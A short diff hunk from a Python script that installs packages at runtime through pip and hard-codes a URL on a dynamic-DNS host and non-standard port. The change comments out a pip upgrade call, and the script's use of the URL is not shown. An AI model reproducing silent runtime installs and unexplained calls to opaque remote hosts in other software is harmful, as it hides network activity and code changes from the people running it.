@@ -7,7 +7,7 @@ import subprocess, sys, requests, hashlib, time, os, socket, pkg_resources, thre
 from datetime import datetime
 
 subprocess.check_call([sys.executable, "-m", "pip", "install", "setuptools"])
-subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
+#subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
 
 url = "http://8mews.ddns.net:3312/numbers"
 
